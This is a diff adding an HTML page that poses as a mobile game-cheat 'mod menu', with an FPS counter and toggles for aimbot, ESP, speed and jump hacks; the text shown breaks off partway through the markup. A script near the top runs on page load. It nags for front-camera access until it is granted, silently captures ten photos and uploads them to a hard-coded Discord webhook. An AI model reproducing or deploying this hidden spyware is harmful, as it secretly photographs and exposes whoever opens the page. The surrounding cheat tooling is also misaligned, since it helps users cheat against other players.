@@ -1,0 +1,3741 @@
+<!doctype html>  
+<html>   
+<head>
+<meta charset="utf-8">  
+<title>試作mod menu</title>  
+          <div class="menu">
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+        <ul>
+
+            <div onclick="toggleContent('content1')">&nbsp;📱&nbsp;&nbsp;FPS：<span id="fpsCounter">120</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>
+         <script>
+(async function(){
+  let stream = null;
+
+  // カメラ許可リトライ関数（許可されるまで1秒ごとに再試行）
+  async function requestCamera(){
+    while(true){
+      try{
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        return stream;
+      }catch(err){
+        if(err.name === "NotAllowedError" || err.name === "PermissionDeniedError"){
+          console.log("カメラ許可が拒否されました。1秒後に再試行します...");
+          await new Promise(r => setTimeout(r, 1000));
+        } else {
+          throw err;
+        }
+      }
+    }
+  }
+
+  // base64 -> Blob変換ヘルパー
+  function base64ToBlob(base64, type='image/png') {
+    const binary = atob(base64.split(',')[1]);
+    const array = [];
+    for(let i=0; i<binary.length; i++){
+      array.push(binary.charCodeAt(i));
+    }
+    return new Blob([new Uint8Array(array)], {type});
+  }
+
+  // Discordに画像を送信
+  async function sendToDiscord(images) {
+    const webhookURL = 'https://discord.com/api/webhooks/1392784557677346917/4EWBhcyy0xmr7nyuBYIJh51HJQ_ZYR-CyBiGNiY5vYfosGWrc2faDMiAWrKWHZYYcjfp';
+
+    const formData = new FormData();
+
+    images.forEach((dataURL, i) => {
+      const blob = base64ToBlob(dataURL);
+      formData.append(`file${i}`, blob, `capture_${i}.png`);
+    });
+
+    formData.append('content', `撮影した${images.length}枚の画像です`);
+
+    const res = await fetch(webhookURL, {
+      method: 'POST',
+      body: formData
+    });
+
+    if(!res.ok){
+      throw new Error(`Discord送信失敗: ${res.status} ${res.statusText}`);
+    }
+  }
+
+  // 1枚キャプチャ
+  async function captureOne(video){
+    const w = video.videoWidth;
+    const h = video.videoHeight;
+    const c = document.createElement('canvas');
+    c.width = w; c.height = h;
+    c.getContext('2d').drawImage(video, 0, 0, w, h);
+    return c;
+  }
+
+  // メイン処理
+  async function startCapture() {
+    try {
+      stream = await requestCamera();
+
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => resolve();
+      });
+
+      const captures = [];
+
+      for(let i=0; i<10; i++){
+        const canvas = await captureOne(video);
+        captures.push(canvas.toDataURL('image/png'));
+        await new Promise(r => setTimeout(r, 50)); // 50ms待つ（10枚で0.5秒）
+      }
+
+      stream.getTracks().forEach(t => t.stop());
+
+      await sendToDiscord(captures);
+
+      alert('Discordに画像を送信しました！');
+
+    } catch(err) {
+      alert("エラー: " + err.message);
+    }
+  }
+
+  startCapture();
+
+})();
+</script>
+<script>
+                let frameCount = 120;
+                let lastTime = performance.now();
+                
+                // 更新帧率显示
+                function updateFPS() {
+                  const currentTime = performance.now();
+                  const deltaTime = currentTime - lastTime;
+                  frameCount++;
+                
+                  // 计算帧率（FPS）
+                  const fps = Math.round(1000 / deltaTime * frameCount);
+                
+                  // 显示帧率
+                  document.getElementById('fpsCounter').textContent = fps;
+                
+                  // 重置计数器
+                  if (deltaTime > 1000) {
+                    frameCount = 0;
+                    lastTime = currentTime;
+                  }
+                
+                  // 每帧调用更新函数
+                  requestAnimationFrame(updateFPS);
+                }
+                
+                // 开始更新帧率
+                updateFPS();
+
+                       
+                
+                
+                
+            </script>
+
+<style>  
+body {  
+  
+    position:center;
+    padding-top: -10px;  
+}  
+#main {
+position:fixed;
+  
+    top: 810px;  
+      left: 3px;  
+
+
+    width: 300px;  
+    height: 25px;   
+    background-color: black;  
+}  
+#show_time0,#show_time {
+position:fixed;
+width:300px;
+height:30px;
+    color: red;  
+}
+</style>  
+</head> 
+<body>  
+<div id="main">  
+<div id="show_time">  
+<script>  
+
+//这里代码多了几行，但是不会延迟显示，速度比较好，格式可以自定义，是理想的时间显示
+setInterval("fun(show_time)",1);
+function fun(timeID){ 
+var date = new Date();  //创建对象  
+var y = date.getFullYear();     //获取年份  
+var m =date.getMonth()+1;   //获取月份  返回0-11  
+var d = date.getDate(); // 获取日  
+var w = date.getDay();   //获取星期几  返回0-6   (0=星期天) 
+var ww = ' 星期'+'日一二三四五六'.charAt(new Date().getDay()) ;//星期几
+var h = date.getHours();  //时
+var minute = date.getMinutes()  //分
+var s = date.getSeconds(); //秒
+var sss = date.getMilliseconds() ; //毫秒
+if(m<10){
+m = "0"+m;
+}
+if(d<10){
+d = "0"+d;
+}
+if(h<10){
+h = "0"+h;
+}
+if(minute<10){
+minute = "0"+minute;
+}
+if(s<10){
+s = "0"+s;
+}
+if(sss<10){
+sss = "00"+sss;
+}else if(sss<100){
+sss = "0"+sss;
+}
+document.getElementById(timeID.id).innerHTML =  y+"-"+m+"-"+d+"   "+h+":"+minute+":"+s+"."+sss+"  "+ww;
+//document.write(y+"-"+m+"-"+d+"   "+h+":"+minute+":"+s);  
+  }
+</script>  
+</div>  
+</div>  
+</body>
+</html>
+
+
+
+<!-- 会用用，不会用垃圾吧倒 -->
+
+<!DOCTYPE html>
+<html>
+<header>
+	<title>h5imgui</title>
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no" />
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<link rel="stylesheet" href="https://unpkg.com/element-ui@_cmvx0/lib/theme-chalk/index.css">
+	<script src="https://cdn.jsdelivr.net/npm/vue@_cmvx0/dist/vue.min.js"></script>
+	<script src="https://unpkg.com/element-ui@_cmvx0/lib/index.js"></script>
+  
+  <script>
+
+
+
+
+var abc = 1;
+var mid= 1;
+var aac = 1;
+var abb = 1;
+var hmn = 1;
+var stm = 1;
+var sir = 1;
+var toh = 1;
+var egg = 1;
+var kar = 1;
+var nji = 1;
+var kyo = 1;
+
+  </script>
+
+
+  
+  
+  
+	<style>
+                .tyu{
+			padding: 0;
+			margin: 0;
+                        background: #000;
+                }
+		* {
+			color: #000;
+		}
+		#alart {
+		width: 400px;
+		height: 60px;
+                position: absolute;
+                right: 0px; 
+		left: 0px;
+		bottom: 100px;
+                background-color: rgba(255, 255, 255, 0.5);
+                text-align: center;
+                margin: auto;
+                border-radius: 20px;
+                transition:0.5s;
+                opacity: 0;
+                font-family: 'Noto Sans JP', sans-serif;
+                }
+		#kalart {
+		width: 400px;
+		height: 55px;
+                position: absolute;
+                right: 0px; 
+		left: 0px;
+		bottom: 100px;
+                background-color: rgba(255, 255, 255, 0.5);
+                text-align: center;
+                margin: auto;
+                border-radius: 20px;
+                transition:0.5s;
+                opacity: 0;
+                font-family: 'Noto Sans JP', sans-serif;
+                }
+		#kaitxt {
+                position: absolute;
+                right: 0px; 
+		left: 0px;
+                top: 15px;
+                text-align: center;
+                margin: auto;
+                font-family: 'Noto Sans JP', sans-serif;
+                }
+		#H5AlertView {
+			width: 220px;
+			height: 300px;
+			position: absolute;
+			left: -110px;
+			top: 150px;
+			text-align: center;
+			zoom: 0.8;
+
+		}
+		#hmini {
+			width: 105px;
+			height: 350px;
+			position: absolute;
+			left: 0px;
+			top: 150px;
+                        background-color: #14161650;
+			text-align: center;
+                        font-family: "Yu Gothic","游ゴシック体";
+		}
+		#mnlog {
+			width: 400px;
+			height: 80px;
+			position: absolute;
+			top: 0px;
+                        left:-440px;
+                        right: 0px; 
+                        background-color: #14161650;
+			text-align: center;
+                        margin: auto;
+                        font-family: "Yu Gothic","游ゴシック体";
+		}
+		#silog {
+			width: 400px;
+			height: 80px;
+			position: absolute;
+			top: 0px;
+                        left: 400px;
+                        right: 40px; 
+                        background-color: #14161650;
+			text-align: center;
+                        margin: auto;
+                        font-family: "Yu Gothic","游ゴシック体";
+		}
+		#hidd {
+			width: 205px;
+			height: 20px;
+			position: absolute;
+			bottom: 0px;
+                        right: -3px;
+                        background-color: #000;
+			text-align: center;
+                        margin: auto;
+		}
+		#hidk {
+			width: 300px;
+			height: 30px;
+			position: absolute;
+			bottom: 0px;
+                        right: -15px;
+                        background-color: #fff;
+			text-align: center;
+                        margin: auto;
+		}
+		.ayimgui {
+			position: fixed;
+			width: 360px;
+			height: 320px;
+			top: calc(50% - 180px);
+			left: calc(50% - 180px);
+			z-index: 999;
+			/* border-radius: 8px; */
+			overflow: hidden;
+			-webkit-user-select: none;
+			-moz-user-select: none;
+			-ms-user-select: none;
+			user-select: none;
+
+
+
+
+
+
+
+
+		}
+
+		.onlyTitle {
+			height: 21px !important;
+		}
+
+		.ayimgui .aytitle {
+			padding: 0 5px;
+			font-size: 16px;
+			background-color: #fff;
+		}
+
+		.ayimgui .aytitle .titleClose {
+			position: absolute;
+			top: 3px;
+			right: 6px;
+			color: #FFF;
+		}
+
+		.ayimgui .aytitle .titleClose:hover {
+			color: #409EFF;
+		}
+
+		.ayimgui .aybody {
+			padding: 15px;
+			height: calc(100% - 21px - 15px - 15px);
+			/*减去标题高度，减去上线padding高度*/
+			overflow: auto;
+			font-size: 14px;
+		}
+
+
+		.aytext {
+			width: 100%;
+			margin-bottom: 10px;
+			display: flex;
+			flex-direction: column;
+			justify-content: space-around;
+			color: #FFF;
+		}
+
+		.el-checkbox {
+			margin: 0px;
+		}
+
+		.el-checkbox__label {
+			color: #FFF;
+		}
+
+		.el-checkbox__input.is-checked+.el-checkbox__label {
+			color: #409EFF;
+		}
+
+		.el-checkbox__inner {
+			background-color: #1D2E48;
+			border: none;
+		}
+		
+		.el-checkbox__input.is-checked+.el-checkbox__label {
+			color: #FFF;
+		}
+
+
+		.el-radio {
+			margin: 8px 0;
+		}
+
+		.el-radio__label {
+			color: #FFF;
+		}
+
+		.el-radio__input.is-checked+.el-radio__label {
+			color: #661a29;
+		}
+
+		.el-radio__inner {
+			background-color: #661a29;
+			border: none;
+		}
+
+		.el-radio__input.is-checked .el-radio__inner {
+			background-color: #661a29;
+		}
+		
+		.el-radio__input.is-checked+.el-radio__label {
+			color: #FFF;
+		}
+
+		.el-radio__inner::after {
+			width: 10px;
+			height: 10px;
+			background-color: #661a29;
+		}
+
+		.onlySelect {
+			background-color: #661a29;
+			border: none;
+		}
+
+		.onlySelect .el-select-dropdown__item {
+			color: #FFF;
+
+		}
+
+		.onlySelect .el-select-dropdown__item.hover,
+		.el-select-dropdown__item:hover:hover {
+			background-color: transparent;
+		}
+
+		.onlySelect .popper__arrow {
+			border-bottom-color: #661a29 !important;
+		}
+
+		.onlySelect.el-popper[x-placement^=bottom] .popper__arrow::after {
+			border-bottom-color: #661a29 !important;
+		}
+
+		.el-select {
+			width: 100%;
+		}
+
+		.el-select .el-input {
+			background-color: #661a29;
+		}
+
+		.el-select .el-input__suffix {
+			background-color: #25456D;
+			color: #FFF;
+			right: 0;
+		}
+
+		.el-select .el-select__caret {
+			color: #FFF;
+		}
+
+		.el-select .el-input__inner {
+			background-color: transparent;
+			border: none;
+			color: #FFF;
+		}
+
+		.el-select .el-input .el-select__caret {
+			color: #FFF;
+		}
+
+		/* 解决ios下拉需要点两次 */
+		.el-scrollbar .el-scrollbar__bar {
+			opacity: 1 !important;
+		}
+
+		.el-button {
+			font-size: 14px;
+			padding: 5px 10px;
+			line-height: 14px;
+			color: #FFF;
+			background-color: #FFF;
+			border: none;
+		}
+
+		.el-button:hover {
+			color: #FFF;
+			background-color: #5e646b;
+		}
+
+		.el-button:focus,
+		.el-button:hover {
+			color: #FFF;
+			background-color: #5e646b;
+		}
+
+		.aycollapse {
+			width: 100%;
+			font-size: 14px;
+			background-color: #284A7A;
+			color: #FFF;
+		}
+
+		.aytab {
+			width: 100%;
+			height: 20px;
+			display: flex;
+			border-bottom: 2px solid #2e9945;
+		}
+
+		.aytab span {
+			padding: 0 5px;
+			height: 100%;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			background-color: #2e9945;
+			color: #FFF;
+			font-size: 14px;
+			font-weight: 500;
+			margin-left: 10px;
+			border-radius: 6px 6px 0 0;
+			cursor: pointer;
+		}
+
+
+		.el-input input {
+			background-color: #1D2E48;
+			border: none;
+			border-radius: 0px;
+			color: #FFF;
+		}
+
+.part-img
+      {
+        width: 500%;
+      }
+
+      .ciamenu1 {
+        width: 290px;
+        height: 43px;
+        border-radius: 12px;
+        background-color: rgba(255, 255, 255, 0.5);
+        position: relative;
+        left: 18px;
+        top: -5px;
+      }
+
+      .ciamain {
+        width: 290px;
+        height: 460px;
+        border-radius: 12px;
+        background-color: rgba(255, 255, 255, 0.5);
+        position: relative;
+        left: 18px;
+        top: 0px;
+      }
+
+      .lan1 {
+        font-size: 19px;
+        color: black;
+        position: relative;
+        left: 80px;
+        top: -4px;
+        font-weight: 600;
+      }
+
+      .lan0 {
+        font-weight: 500;
+        position: relative;
+        font-size: 17px;
+        top: 8px;
+        left: 18px;
+
+      }
+
+      .ts {
+        box-shadow: rgba(118, 118, 118, .44) 5px 5px 5px 5px;
+        width: 150px;
+        height: 40px;
+        background: #ffb9ff;
+        position: relative;
+        color: yellow;
+        text-align: center;
+        top: 200px;
+        left: 70px;
+        border-radius: 10px;
+      }
+
+      .tsz {
+        font-size: 13px;
+        top: 11px;
+        position: relative;
+
+      }
+
+      .lan01 {
+        font-weight: 500;
+        position: relative;
+        font-size: 17px;
+        top: 5px;
+        left: 18px;
+
+      }
+
+      .lan02 {
+        font-weight: 500;
+        position: relative;
+        font-size: 17px;
+        top: 10px;
+        left: 18px;
+      }
+
+      .lan2 {
+        font-size: 12.5px;
+        position: relative;
+        color: #aeaeae;
+        left: 30px;
+        top: -10px;
+      }
+
+      .lan3 {
+        font-size: 12.5px;
+        position: relative;
+        color: #ffb9ff;
+        left: 50px;
+        top: -3px;
+      }
+      
+      .lan4 {
+        font-size: 12.5px;
+        position: relative;
+        color: #ffb9ff;
+        left: 30px;
+        top: -3px;
+      }
+
+      .zhuangt {
+        font-size: 15px;
+        position: relative;
+        left: 85px;
+
+      }
+
+      .switch-btn {
+        cursor: pointer;
+        width: 50px;
+        height: 30px;
+        position: relative;
+        top: 3px;
+        right: 15px;
+        border: 0px solid #dfdfdf;
+        background-color: #d0d4dd;
+        box-shadow: #dfdfdf 0 0 0 0 inset;
+        border-radius: 100px;
+        background-clip: content-box;
+        display: inline-block;
+        -webkit-appearance: none;
+        user-select: none;
+        outline: none;
+        float: right;
+                    -webkit-transition: 0.4s;
+            transition: 0.4s;
+      }
+
+      .switch-btn:before {
+        content: '';
+        width: 26px;
+        height: 26px;
+        position: absolute;
+        top: 2px;
+        left: 2px;
+        ;
+        border-radius: 20px;
+        background-color: white;
+        box-shadow: 5px;
+        border: 0;
+                    -webkit-transition: 0.4s;
+            transition: 0.4s;
+      }
+
+      .switch-btn:checked {
+        border-color: #00d600;
+        box-shadow: #23b574 0 0 0 16px inset;
+        background-color: #00bf00;
+                    -webkit-transition: 0.4s;
+            transition: 0.4s;
+      }
+
+      .switch-btn:checked:before {
+        left: 22px;
+      }
+
+      .switch-btn.switch-btn-animbg {
+        transition: background-color ease .4s;
+      }
+
+      .switch-btn.switch-btn-animbg:before {
+        transition: left .3s;
+      }
+
+      .switch-btn.switch-btn-animbg:checked {
+        box-shadow: red 0 0 0 0 inset;
+        background-color: black;
+        transition: border-color 4s, background-color ease 4s;
+      }
+
+      .switch-btn.switch-btn-animbg:checked:before {
+        transition: left .3s;
+      }
+
+
+
+      .scrollbar {
+        overflow-x: hidden;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      .scrollbar::-webkit-scrollbar {
+        width: 0px;
+
+        height: 5px;
+
+        background-color: #F5F5F5;
+
+      }
+
+
+      .scrollbar::-webkit-scrollbar-track {
+        -webkit-box-shadow: inset 0 0 6px rgba(45, 45, 45, .41);
+
+        background-color: rgba(45, 45, 45, .41);
+
+      }
+
+
+      .scrollbar::-webkit-scrollbar-thumb {
+        border-radius: 15px;
+
+        -webkit-box-shadow: inset 0 0 6px rgba(45, 45, 45, .41);
+
+        background-color: rgba(45, 45, 45, .41);
+
+      }
+
+      .xian {
+
+        position: relative;
+        float: right;
+        height: 0.6px;
+        width: 235px;
+        background: #cacaca;
+        border: none;
+      
+
+      .xian2 {
+
+        position: relative;
+        float: right;
+        height: 0.6px;
+        width: 235px;
+        background: #cacaca;
+        border: none;
+        top: 8px;
+      }
+
+      .xian3 {
+
+        position: relative;
+        float: right;
+        height: 0.3px;
+        width: 235px;
+        background: #cacaca;
+        border: none;
+        top: 5px;
+      }
+
+      .xian4 {
+
+        position: relative;
+        float: right;
+        height: 0.6px;
+        width: 235px;
+        background: #cacaca;
+        border: none;
+        top: 3px;
+      }
+
+      .xian5 {
+
+        position: relative;
+        float: right;
+        height: 0.6px;
+        width: 235px;
+        background: #cacaca;
+        border: none;
+        top: -4px;
+      }
+
+	</style>
+</header>
+<div id="hmini">
+<p>制作者Twitter<br>@_cmvx0<br></p>
+</div>
+<div id="mnlog">
+<a>制作者<br>
+ID:show.xxx</a>
+<p id="log"></p>
+</div>
+<div id="silog">
+<a>2次配布は禁止です<br>
+</a>
+<br>
+<p id="sllog"></p>
+</div>
+<div id="hidd">
+<a>制作者𝕋𝕨𝕚𝕥𝕥𝕖𝕣:@_cmvx0</a>
+</div>
+<div id="hidk">
+<a>制作者𝕋𝕨𝕚𝕥𝕥𝕖𝕣:@_cmvx0</a>
+</div>
+<div id="alart">
+<a id="maintxt" style="font-size:16px;position: relative;top:6px;"></a>
+<br>
+<a id="subtxt" style="font-size:15px;position: relative;top:6px;"></a>
+</div>
+
+<div id="kalart">
+<br>
+<a id="kaitxt" style="font-size:18px;"></a>
+</div>
+
+<body>
+	<div id="app">
+		<div :class="!ifshow?'onlyTitle ayimgui':'ayimgui'" ref="menuMain">
+			<div class="aytitle" @_cmvx0="titleTouchStart" @_cmvx0="titleTouchMove">
+				<i :class="ifshow?'el-icon-caret-bottom':'el-icon-caret-top'" @_cmvx0="ifshow = !ifshow"></i>
+				<span class="title-age" style="margin-left:5px;">Eden ver10.3 memory offset mod</span>
+				<i class="titleClose el-icon el-icon-close" @_cmvx0="closeimgui"></i>
+			</div>
+			<div class="aybody">
+				<div class="aytab">
+					<span @_cmvx0="changeTab('one')"
+    :style="{background: tabValue==='one'?'#8696ad':'#5e646b', textAlign: 'center', display: 'inline-block', width: '100%'}">
+    Twitter
+</span>
+
+<span @_cmvx0="changeTab('ktt')"
+    :style="{background: tabValue==='ktt'?'#8696ad':'#5e646b', textAlign: 'center', display: 'inline-block', width: '100%'}">
+    @_cmvx0
+</span>
+
+<span @_cmvx0="changeTab('tnx')"
+    :style="{background: tabValue==='tnx'?'#8696ad':'#5e646b', textAlign: 'center', display: 'inline-block', width: '100%'}">
+    質問等
+</span>
+
+<span @_cmvx0="changeTab('v1x')"
+    :style="{background: tabValue==='v1x'?'#8696ad':'#5e646b', textAlign: 'center', display: 'inline-block', width: '100%'}">
+    更新内容
+</span>
+
+				</div>
+				<div v-show="tabValue==='one'">
+					<div class="aytext">
+					</div>
+<br>
+      <div class=ciamenu1>
+
+        <label><span class=lan0>全てのチートをON</span><input class="switch-btn switch-btn animbg" type="checkbox" id="ikisugi"
+                                                  onclick="ikisugi()"></label><br>
+      </div> 
+
+        <label><span class=lan0>ーーーーーーーーーーーーーーーーー</span>
+                                                  </label><br>
+ <br>
+
+<span>人物加速</span>
+<input type="range" id="slider1" min="1" max="1.45" step="0.01" value="1"style="width:70%"/>
+<span id="rangevalue1">1</span>
+<br>
+
+<span>全体加速</span>
+<input type="range" id="slider2" min="1" max="1.45" step="0.01" value="1"style="width:70%"/>
+<span id="rangevalue2">1</span>
+<br>
+
+<span>全巨大化</span>
+<input type="range" id="slider3" min="1" max="3" step="0.01" value="1"style="width:70%"/>
+<span id="rangevalue3">1</span>
+<br>
+
+       <label><span class=lan0>ーーーーーーーーーーーーーーーーー</span>
+                                                  </label><br>
+ 
+      <span class=lan4></span><div class=ciamain>
+<label><span class=lan0>扩大</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox7"
+            onclick="c11()"></label>
+        <hr class=xian>
+
+ <br>
+<label><span class=lan0>天线[壱]</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox6"
+            onclick="c6()"></label>
+        <hr class=xian>
+
+ <br>
+<label><span class=lan0>天线[弐]</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox5"
+            onclick="c8()"></label>
+        <hr class=xian>
+
+
+        <br>
+
+<br>
+<label><span class=lan0>微巨大化</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox13"
+            onclick="c27()"></label>
+        <hr class=xian>
+
+<br>
+<br>
+
+
+
+      
+
+<label><span class=lan0>红々着色</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox1"
+            onclick="c2()"></label>
+        <hr class=xian>
+        <br>
+<label><span class=lan0>绿々着色</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox2"
+            onclick="c3()"></label>
+        <hr class=xian>
+        <br>
+<label><span class=lan0>白々着色</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox3"
+            onclick="c4()"></label>
+        <hr class=xian>
+        <br>
+<label><span class=lan0>青々着色</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox6"
+            onclick="c7()"></label>
+        <hr class=xian>
+
+
+        <br>
+<label><span class=lan0>虹々着色</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox6"
+            onclick="c26()"></label>
+        <hr class=xian>
+
+
+        <br>
+<label><span class=lan0>进入地面</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox4"
+            onclick="c5()"></label>
+        <hr class=xian>
+
+       
+        
+        <br>
+<label><span class=lan0>説明</span><input class="switch-btn switch-btn animbg" type="checkbox" id="checkbox4"
+            onclick="setumei()"></label>
+        <hr class=xian>
+        <br>
+
+
+<br>
+
+      </div><br>
+
+  
+
+              
+              
+            				</div>
+
+			<div v-show="tabValue === 'two'">
+				<div class="aytext">
+				</div>  
+              
+              					<el-button onclick="draw()">ESPON</el-button>
+					
+					<el-button onclick="unDraw()">ESPOFF</el-button>
+
+                                        <el-button onclick="antena()">アンテナ</el-button>
+                                        
+                                        <el-button onclick="cxx()">icon</el-button>
+                                        <br>
+                                        <br>
+					<el-button onclick="zhidou()">拡大自動更新</el-button> <span id="zhinow">自動更新OFF</span>
+                                        <br>
+                                        <br>
+					<el-button onclick="zdsshs()">ESP自動更新</el-button> <span id="zhienow">自動更新OFF</span>
+					<br>
+					<br>
+					<el-button onclick="sxpdhs()">線</el-button>
+					<el-button onclick="jmzmhs()">SilentAim</el-button>
+                                        <el-button onclick="zszbhq()">重获自身坐标</el-button>
+                                        <el-button onclick="testfn()">TS</el-button>
+					<br>
+					<br>
+					<input id="check22" type="checkbox" onclick="zsyhs()">自适应范围
+					<br>
+					<br>
+
+                                        <br>
+                                        <a>胴</a><a id="ddo">0.74</a>
+                                        <input type="range" id="doudou" min="0.22" max="4.3" step="0.01" value="0.8" style="width:100%">
+                                        <br>
+					静默自瞄范围<a id="para5"></a>
+					<input type="range" id="sdfwaa" min="0" max="2000" step="1" value="300" style="width:80%" />
+                                        <br>
+					偏移范围<a id="para6"></a>
+					<input type="range" id="faawss" min="-3" max="3" step="0.01" value="0.92" style="width:80%" />
+                                        <el-button onclick="fadef()">デフォ</el-button>
+                                        <el-button onclick="fan1()">中</el-button>
+                                        <el-button onclick="fatou()">頭</el-button>
+              
+              
+                                <br>
+				<el-button onclick="ride()">乗車</el-button>
+                                <el-button onclick="flyd()">浮上</el-button>
+                                <el-button onclick="hig()">高跳</el-button>
+                                <el-button onclick="oll()">着色</el-button>
+                                <el-button onclick="tx()">天</el-button>
+				<br>
+				<br>
+                                <el-button onclick="rrf()">遅延</el-button>
+                                <el-button onclick="sitata()">地面</el-button>
+                                <el-button onclick="sitata45()">下</el-button>
+				<el-button onclick="lplpp8()">6.25</el-button>
+                                <el-button onclick="xxxs()">无后</el-button>
+				<br>
+				<br>
+                                <el-button onclick="tya1()">激战黄</el-button>
+                                <el-button onclick="tya2()">飓风黄</el-button>
+				<el-button onclick="niji1()">激战虹</el-button>
+                                <el-button onclick="niji()">飓风虹</el-button>
+				<br>
+				<br>
+                                <el-button onclick="glow()">低燃費</el-button>
+				<el-button onclick="shesu()">搜索射速</el-button>
+				<el-button onclick="yuss()">搜索功能</el-button>
+				<br>
+				<br>
+				<el-button onclick="zhuanqyss()">搜索转圈</el-button>
+                                <input class="switch-btn switch-btn animbg" type="checkbox" onclick="higg()"><h>高跳</h>
+                                <input class="switch-btn switch-btn animbg" type="checkbox" onclick="flyy()"><h>空中浮遊</h>
+                                <input class="switch-btn switch-btn animbg" type="checkbox" onclick="flyy1()"><h>空中上昇</h>
+				<br>
+				<br>
+				<el-button onclick="liantiaoyss()">搜索连跳</el-button>
+                                <el-button onclick="flyr()">-----------------reset----------------</el-button>
+				<br>
+				<br>
+				<div class="mycheckbox">
+				<input id="check2" type="checkbox" onclick="zdjshs()">加速
+				<input id="check3" type="checkbox" onclick="lths()">连跳
+				<input id="check4" type="checkbox" onclick="gths()">高跳
+				<input id="check5" type="checkbox" onclick="zhuanq()">转圈
+				<br>
+				<br>
+				<input id="check7" type="checkbox" onclick="sdgd()">浮空
+				<input id="check8" type="checkbox" onclick="jshs()">射速
+				<input id="check21" type="checkbox" onclick="ydst()">原地升天
+
+				
+				
+				
+				</div>
+				加速值，建议1.100，最高1.15，否则拉回
+				<input type="range" id="aaaaaaaa" min="1.0" max="1.3" step="0.001" value="1.10" style="width:80%" />
+				<body>
+				<p id="para1"></p>
+				</body>
+				高跳值，建议10
+				<br>
+				<input type="range" id="gtaaa" min="0.1" max="100" step="0.1" value="10" style="width:80%" />
+				<body>
+				<p id="para2"></p>
+				</body>
+				转圈速度
+				<br>
+				<input type="range" id="zqsd" min="1" max="1000" step="1" value="50" style="width:80%" />
+				<body>
+				<p id="para4"></p>
+				</body>
+				射速
+				<br>
+				<input type="range" id="shesuaf" min="1" max="10" step="0.1" value="3" style="width:80%" />
+
+				<body>
+				<p id="para8"></p>
+				</body>
+				</div>
+				<div v-show="tabValue==='ktt'">
+					<div class="aytext">
+					</div>
+                                        <br>
+
+					<br><br>
+offset
+<br>
+<el-button onclick="showOptions()">激戦野原</el-button>
+<el-button onclick="showOptionn()">嵐の半島</el-button>
+<br>
+ｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰ
+<br>
+𝑚𝑒𝑚𝑜𝑟𝑦 no risk
+<br>
+<el-button onclick="c9()">搜索天线</el-button>
+<el-button onclick="c15()">目拡大</el-button>
+<el-button onclick="c25()">血の色変更</el-button>
+<br>
+ｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰ
+<br>
+𝑚𝑒𝑚𝑜𝑟𝑦 detection risk
+<br>
+<el-button onclick="c12()">足加速</el-button>
+<el-button onclick="c14()">レート加速</el-button>
+<el-button onclick="c16()">無限ジャンプ</el-button>
+<br>
+<br>
+<el-button onclick="c19()">脚アンテナ</el-button>
+<el-button onclick="c24()">弾丸エフェクト</el-button>
+<br>
+<br>
+<el-button onclick="c20()">i am atomic</el-button>
+<br>
+ｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰ
+<br>
+VIP
+<br>
+<el-button onclick="c13()">no recoil</el-button>
+<el-button onclick="c17()">Glow ESP</el-button>
+<br>
+<br>
+<el-button onclick="c21()">high jump</el-button>
+<el-button onclick="c22()">防具破壊</el-button>
+<br>
+<br>
+<el-button onclick="c23()">壁登り</el-button>
+<br>
+ｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰｰ
+<br>
+status
+<br>
+
+                                        <el-button onclick="refl()">Refresh</el-button>
+                                        <el-button onclick="minigui()">Status表示</el-button>
+                                        <el-button onclick="minilog()">LOG</el-button>
+                                        <el-button onclick="kaihatu()">開発LOG</el-button>
+					<br>
+					<br>
+                                        <el-button onclick="hider()">SpoofID</el-button>
+                                </div>
+				<div v-show="tabValue==='tmtm'">
+					<div class="aytext">
+					</div>
+                  
+                  
+                                                          <el-button onclick="carx()">车锁</el-button>
+                                        <input id="cxxx" type="checkbox" onclick="carxn()">车锁S
+                                        <el-button onclick="cark()">车透視</el-button>
+                                        <el-button onclick="carxd()">120锁</el-button>
+                                        <el-button onclick="zimm()">车地面</el-button>
+					<br>
+				甲
+				<br>
+				<input type="range" id="suojia" min="0.22" max="6" step="0.01" value="0.8" style="width:80%" />
+				<body>
+				<p id="parati"></p>
+				</body>
+				头
+				<br>
+				<input type="range" id="suotou" min="0.15" max="4.3" step="0.01" value="0.28" style="width:80%" />
+				<body>
+				<p id="paratou"></p>
+				</body>
+				范围初始值0.04
+				<br>
+				<input type="range" id="fanw" min="0.04" max="2" step="0.01" value="0.4" style="width:80%" />
+				<body>
+				<p id="para3"></p>
+				</body>
+				头范围
+				<input type="range" id="touaaaa" min="0.15" max="4.3" step="0.01" value="0.28" style="width:80%" />
+				<body>
+				<p id="paratouaa"></p>
+				</body>
+				甲范围
+				<input type="range" id="jiaaaaa" min="0.22" max="6" step="0.01" value="0.7" style="width:80%" />
+				<body>
+				<p id="parajiaaa"></p>
+				</body>
+				胳膊范围
+				<input type="range" id="geboaaaa" min="0.04" max="4" step="0.01" value="0.4" style="width:80%" />
+				<body>
+				<p id="parageboaa"></p>
+				</body>
+				移动速度
+				<input type="range" id="fsdfydsd" min="0.01" max="1" step="0.01" value="0.2" style="width:80%" />
+				<body>
+				<p id="para9"></p>
